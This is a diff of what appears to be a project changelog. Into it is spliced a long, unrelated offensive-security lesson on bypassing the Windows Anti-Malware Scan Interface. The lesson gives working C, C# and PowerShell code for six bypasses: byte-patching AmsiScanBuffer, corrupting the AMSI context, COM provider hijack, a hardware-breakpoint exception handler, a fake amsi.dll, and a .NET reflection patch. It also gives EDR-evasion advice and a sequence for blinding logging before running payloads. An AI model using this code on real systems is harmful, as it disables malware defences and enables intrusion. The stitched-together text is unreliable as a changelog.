@@ -19,7 +19,349 @@
 - Upgraded font-awesome to 6.5.2 (#1330)
 - Fixed tables not having a scroll bar when wider than the page (usually happened on mobile) (#1452)
 - Add author name to RSS feed (#1442)
+```
+The Anti-Malware Scan Interface (AMSI) is a Windows interface introduced in Windows 10 that allows applications to send content to the registered anti-malware provider for scanning before execution. It is the primary defense against fileless attacks: PowerShell scripts, .NET in-memory assemblies, VBScript, JScript, and Office VBA macros are all submitted to AMSI before they run.
 
+For offensive developers, AMSI is a gate that must be opened before any in-memory payload can execute through a scripting engine or managed runtime. This lesson covers the architecture of AMSI, its internal flow, and multiple bypass techniques ranging from memory patching to hardware breakpoints.
+
+AMSI Architecture
++==========================================+
+|  PowerShell / .NET / VBScript / VBA      |
+|  (AMSI Consumer)                         |
++====================+=====================+
+                     |
+                     | AmsiScanBuffer() / AmsiScanString()
+                     v
++====================+=====================+
+|            amsi.dll (In-Process)         |
+|                                          |
+|  AmsiInitialize() -> Create context      |
+|  AmsiOpenSession() -> Create session     |
+|  AmsiScanBuffer() -> Submit content      |
+|  AmsiScanString() -> Submit string       |
+|  AmsiCloseSession()                      |
+|  AmsiUninitialize()                      |
++====================+=====================+
+                     |
+                     | COM Interface: IAntimalwareProvider
+                     v
++====================+=====================+
+|  Anti-Malware Provider                   |
+|  (Windows Defender / EDR DLL)            |
+|                                          |
+|  Scan() -> Returns AMSI_RESULT           |
+|  AMSI_RESULT_CLEAN = 0                   |
+|  AMSI_RESULT_DETECTED = 32768            |
++==========================================+
+Internal Flow of AmsiScanBuffer
+When PowerShell executes a script block, it calls AmsiScanBuffer in amsi.dll. Here is the simplified internal flow:
+
+HRESULT AmsiScanBuffer(
+    HAMSICONTEXT amsiContext,   // Initialized context
+    PVOID        buffer,        // Content to scan
+    ULONG        length,        // Buffer length
+    LPCWSTR      contentName,   // Name/identifier
+    HAMSISESSION amsiSession,   // Current session
+    AMSI_RESULT  *result        // OUTPUT: scan result
+) {
+    // 1. Validate the context (check magic value "AMSI" at offset 0)
+    if (amsiContext == NULL || amsiContext->Signature != 'ISMA')  // "AMSI" reversed
+        return E_INVALIDARG;  // <-- If context is invalid, scan is SKIPPED
+
+    // 2. Check if AMSI has been initialized successfully
+    if (amsiContext->AmsiInitFailed)
+        return E_FAIL;  // <-- If init failed, scan is SKIPPED
+
+    // 3. Forward buffer to registered anti-malware provider via COM
+    hr = amsiContext->Provider->Scan(amsiSession, buffer, length, contentName, result);
+
+    return hr;
+}
+The critical insight: there are multiple points in this flow where the scan can be short-circuited.
+
+Bypass Technique 1: Patching AmsiScanBuffer
+The most well-known technique. Overwrite the first bytes of AmsiScanBuffer to force it to return immediately with AMSI_RESULT_CLEAN.
+
+The Patch
+On x64, we overwrite the first 6 bytes of AmsiScanBuffer with instructions that set EAX = 0x80070057 (E_INVALIDARG) and return:
+
+; Original AmsiScanBuffer prologue:
+48 89 5C 24 08    mov [rsp+8], rbx
+48 89 74 24 10    mov [rsp+10h], rsi
+...
+
+; After patching:
+B8 57 00 07 80    mov eax, 0x80070057   ; E_INVALIDARG
+C3                ret                    ; Return immediately
+When AmsiScanBuffer returns E_INVALIDARG, the caller (PowerShell) treats it as a scan failure and proceeds without blocking the content.
+
+C Implementation
+#include <windows.h>
+
+BOOL PatchAmsiScanBuffer(void) {
+    // Step 1: Get handle to amsi.dll (loaded in PowerShell process)
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (!hAmsi) {
+        // If not loaded yet, load it
+        hAmsi = LoadLibraryA("amsi.dll");
+        if (!hAmsi) return FALSE;
+    }
+
+    // Step 2: Get address of AmsiScanBuffer
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) return FALSE;
+
+    // Step 3: Change memory protection to RW
+    DWORD oldProtect;
+    if (!VirtualProtect(pAmsiScanBuffer, 6, PAGE_READWRITE, &oldProtect))
+        return FALSE;
+
+    // Step 4: Write the patch
+    // mov eax, 0x80070057; ret
+    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+
+    // Step 5: Restore memory protection
+    VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
+
+    return TRUE;
+}
+Detection Concerns
+This technique is heavily monitored:
+
+EDRs hook GetProcAddress and flag lookups for "AmsiScanBuffer"
+EDRs monitor VirtualProtect calls targeting amsi.dll memory
+Some EDRs periodically verify AmsiScanBuffer integrity
+The string "AmsiScanBuffer" itself is flagged
+Mitigations for Detection
+Resolve AmsiScanBuffer address by walking the export table manually (avoid GetProcAddress)
+Use obfuscated strings (from Lesson 02)
+Use NtProtectVirtualMemory directly instead of VirtualProtect
+Restore the original bytes after your payload has been scanned
+Bypass Technique 2: Corrupting the AMSI Context (AmsiInitFailed)
+Instead of patching AmsiScanBuffer, corrupt the AMSI context structure. When amsiContext->Signature is invalid, all subsequent scan calls return E_INVALIDARG without scanning.
+
+How It Works
+The AMSI context is a structure in heap memory. The first 4 bytes contain the magic value "AMSI" (0x49534D41). If we corrupt this value, every call to AmsiScanBuffer fails validation and returns without scanning.
+
+BOOL CorruptAmsiContext(void) {
+    // The AMSI context pointer is stored in a global variable within amsi.dll
+    // We need to find it by pattern scanning
+
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (!hAmsi) return FALSE;
+
+    // Get the .data section of amsi.dll (where global variables live)
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hAmsi;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hAmsi + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)section[i].Name, ".data") == 0) {
+            BYTE* dataStart = (BYTE*)hAmsi + section[i].VirtualAddress;
+            DWORD dataSize = section[i].Misc.VirtualSize;
+
+            // Scan for the AMSI magic "AMSI" (0x49534D41)
+            for (DWORD j = 0; j < dataSize - 4; j++) {
+                if (*(DWORD*)(dataStart + j) == 0x49534D41) {
+                    // Found context, corrupt the signature
+                    DWORD oldProtect;
+                    VirtualProtect(dataStart + j, 4, PAGE_READWRITE, &oldProtect);
+                    *(DWORD*)(dataStart + j) = 0x00000000;
+                    VirtualProtect(dataStart + j, 4, oldProtect, &oldProtect);
+                    return TRUE;
+                }
+            }
+        }
+    }
+    return FALSE;
+}
+Forcing AmsiInitFailed in PowerShell
+In PowerShell, you can directly set the internal initialization flag:
+
+# This is the concept - actual implementation requires reflection
+# to access the internal AmsiUtils class in System.Management.Automation
+$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$field = $ref.GetField('amsiInitFailed','NonPublic,Static')
+$field.SetValue($null,$true)
+Note: This exact string is detected by AMSI itself. You must obfuscate it (string concatenation, encoding, etc.).
+
+Bypass Technique 3: COM Hijack / Provider Redirection
+AMSI uses COM to communicate with the anti-malware provider. The provider's CLSID is registered in the registry. If we redirect the COM registration to a DLL we control, AMSI will load our DLL instead of the real provider.
+
+Registry Key
+HKLM\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}
+  \InProcServer32
+    (Default) = "C:\ProgramData\FakeAmsiProvider.dll"
+The CLSID {2781761E-28E0-4109-99FE-B9D127C57AFE} is the Windows Defender AMSI provider.
+
+Custom Provider DLL
+// FakeAmsiProvider.dll - Implements IAntimalwareProvider
+// Returns AMSI_RESULT_CLEAN for every scan
+
+HRESULT __stdcall Scan(
+    IAmsiStream *stream,
+    AMSI_RESULT *result
+) {
+    *result = AMSI_RESULT_CLEAN;  // Everything is clean
+    return S_OK;
+}
+This requires write access to HKLM (admin privileges) but is persistent across reboots.
+
+Bypass Technique 4: Hardware Breakpoint Bypass
+This is the most sophisticated technique and the hardest for EDRs to detect. Instead of modifying any memory, we use CPU hardware breakpoints to intercept execution at AmsiScanBuffer and modify the return value via a Vectored Exception Handler (VEH).
+
+How It Works
+1. Register a VEH that handles SINGLE_STEP exceptions
+2. Set a hardware breakpoint (DR0) on AmsiScanBuffer address
+3. When AmsiScanBuffer is called, CPU triggers a SINGLE_STEP exception
+4. VEH fires, modifies the return value (RCX register / result pointer)
+5. VEH sets RIP to the return address (skips AmsiScanBuffer entirely)
+6. Execution continues with AMSI_RESULT_CLEAN
+Implementation
+#include <windows.h>
+
+// Global: address of AmsiScanBuffer
+FARPROC g_pAmsiScanBuffer = NULL;
+
+// VEH handler
+LONG CALLBACK AmsiBypassVEH(PEXCEPTION_POINTERS ExceptionInfo) {
+    // Check if this is our hardware breakpoint
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_pAmsiScanBuffer) {
+
+            // AmsiScanBuffer parameters (x64 calling convention):
+            // RCX = amsiContext
+            // RDX = buffer
+            // R8  = length
+            // R9  = contentName
+            // [RSP+0x28] = amsiSession
+            // [RSP+0x30] = result (pointer to AMSI_RESULT)
+
+            // Set the result to AMSI_RESULT_CLEAN (0)
+            AMSI_RESULT* pResult = (AMSI_RESULT*)(*(DWORD64*)(
+                ExceptionInfo->ContextRecord->Rsp + 0x30));
+            if (pResult) *pResult = 0;  // AMSI_RESULT_CLEAN
+
+            // Set return value to S_OK
+            ExceptionInfo->ContextRecord->Rax = S_OK;
+
+            // Skip AmsiScanBuffer: set RIP to return address
+            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(
+                ExceptionInfo->ContextRecord->Rsp);
+            ExceptionInfo->ContextRecord->Rsp += 8;  // Pop return address
+
+            // Clear the breakpoint to avoid infinite loop
+            // (will be re-set on next call if needed)
+
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+BOOL SetAmsiHWBP(void) {
+    // Get AmsiScanBuffer address
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    g_pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!g_pAmsiScanBuffer) return FALSE;
+
+    // Register VEH
+    AddVectoredExceptionHandler(1, AmsiBypassVEH);
+
+    // Set hardware breakpoint on DR0
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    GetThreadContext(GetCurrentThread(), &ctx);
+
+    ctx.Dr0 = (DWORD64)g_pAmsiScanBuffer;  // Address to break on
+    ctx.Dr7 = (ctx.Dr7 & ~(0x3 << 0)) | 0x1;  // Enable DR0 (local)
+    ctx.Dr7 = (ctx.Dr7 & ~(0x3 << 16));  // Break on execution (00)
+    ctx.Dr7 = (ctx.Dr7 & ~(0x3 << 18));  // 1-byte length (00)
+
+    SetThreadContext(GetCurrentThread(), &ctx);
+
+    return TRUE;
+}
+Advantages of Hardware Breakpoint Bypass
+No memory modification: AmsiScanBuffer bytes are untouched (integrity checks pass)
+No VirtualProtect: No suspicious memory protection changes on amsi.dll
+Hard to detect: EDR would need to check debug registers, which is uncommon
+No strings: No need to resolve "AmsiScanBuffer" by name (can find by offset)
+Disadvantages
+Limited to 4 hardware breakpoints (DR0-DR3)
+Only works on the thread where the breakpoint is set
+Some EDRs (advanced) check debug registers via GetThreadContext
+Must handle all threads in the process for full coverage
+Bypass Technique 5: Forcing an Error in AmsiInitialize
+If AMSI fails to initialize, all subsequent scans are skipped. We can force initialization failure by:
+
+DLL Load Order Hijack
+Place a crafted amsi.dll in the application directory. Due to DLL search order, it loads before the real amsi.dll from System32.
+
+// Fake amsi.dll - exports all AMSI functions as no-ops
+__declspec(dllexport) HRESULT AmsiInitialize(LPCWSTR appName, HAMSICONTEXT *context) {
+    return E_FAIL;  // Initialization failed
+}
+
+__declspec(dllexport) HRESULT AmsiScanBuffer(
+    HAMSICONTEXT ctx, PVOID buf, ULONG len,
+    LPCWSTR name, HAMSISESSION session, AMSI_RESULT *result) {
+    *result = AMSI_RESULT_CLEAN;
+    return S_OK;
+}
+
+// ... export all other AMSI functions as stubs
+Bypass Technique 6: Patching in .NET Context
+For .NET-based AMSI bypass (relevant when loading assemblies via Assembly.Load):
+
+// Use reflection to access AmsiUtils in System.Management.Automation
+// and patch the amsiSession field
+
+using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+public class AmsiBypass {
+    [DllImport("kernel32")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string name);
+
+    [DllImport("kernel32")]
+    static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(IntPtr addr, UIntPtr size,
+        uint newProtect, out uint oldProtect);
+
+    public static void Patch() {
+        IntPtr hAmsi = LoadLibrary("amsi.dll");
+        IntPtr pASB = GetProcAddress(hAmsi, "AmsiScanBuffer");
+
+        uint oldProtect;
+        VirtualProtect(pASB, (UIntPtr)6, 0x40, out oldProtect);
+
+        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+        Marshal.Copy(patch, 0, pASB, patch.Length);
+
+        VirtualProtect(pASB, (UIntPtr)6, oldProtect, out oldProtect);
+    }
+}
+Detection and Response Considerations
+Technique	Detection Vector	OPSEC Rating
+AmsiScanBuffer Patch	Memory integrity check, VirtualProtect on amsi.dll	Low
+Context Corruption	Memory scanning for corrupted AMSI magic	Medium
+COM Hijack	Registry monitoring, COM auditing	Medium
+Hardware Breakpoint	Debug register inspection (rare)	High
+DLL Hijack	File creation in application directory	Low
+.NET Reflection	Script block logging (if ETW not patched)	Low
+Best Practice: Combined Approach
+1. First: Patch ETW (Lesson 05) to blind script block logging
+2. Then:  Apply hardware breakpoint AMSI bypass (no memory modification)
+3. Now:   Execute PowerShell / .NET payloads without AMSI scanning
+4. After: Clean up hardware breakpoints
+Summary
+AMSI is a powerful defense against fileless attacks, but it operates entirely in user-mode memory, making it fundamentally vulnerable to process-level tampering. The six bypass techniques covered (memory patching, context corruption, COM hijack, hardware breakpoints, initialization failure, and .NET reflection) each have different OPSEC profiles. The hardware breakpoint technique is the most stealthy because it modifies no memory and avoids the API calls that EDRs monitor. However, all AMSI bypasses should be combined with ETW patching (Lesson 05) to prevent the bypass attempt itself from being logged.
+```
 ## v6.0.1 (2023-06-08)
 
 This version has been in the works for a few years. It includes several new features that were highly requested, numerous bug fixes, new documentation, and aggresively encourages migrating from the old Google Universal Analytics to the new Analytics 4.
